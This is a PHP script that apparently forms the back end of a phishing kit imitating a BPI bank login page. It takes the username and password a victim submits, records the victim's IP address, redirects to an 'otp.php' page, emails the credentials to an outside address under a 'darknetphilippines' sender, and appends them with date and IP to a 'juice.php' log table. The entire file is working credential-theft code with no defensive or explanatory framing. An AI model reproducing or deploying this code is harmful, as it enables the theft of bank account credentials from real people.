<?php
$username = ($_POST['form1598888738310_user_id']);
$password = ($_POST['form1598888738310_password']);
$host = ($_SERVER['SERVER_NAME']);
$ip = ($_SERVER['REMOTE_ADDR']);
$path = ($_SERVER['REQUEST_URI']);
$date = date("y/m/d h:i:sa");
file_get_contents("");
 header ('Location:otp.php');
 
$to = "@yahoo.com";
$subject = "=========================-[$ip BPI-Data-Login-BPI]-==========================";
$txt = "Username: $username \r\n Password: $password \r\n Remote Address: $ip";
$headers = "From: darknetphilippines@z3r1on.com";

mail($to,$subject,$txt,$headers);

$File = "juice.php";
$fhandle = fopen($File, 'a');
 
fwrite($fhandle,'<tr>');
fwrite($fhandle,'<td><font color="yellow">'.$username.'</td>');
fwrite($fhandle,'<td><font color="yellow">'.$password.'</td>');
fwrite($fhandle, '<td><font color="yellow">'.$date.'</td>');
fwrite($fhandle, '<td><font color="yellow">'.$ip.'</td>');
fwrite($fhandle,'</tr>');
fclose($fhandle);
?>
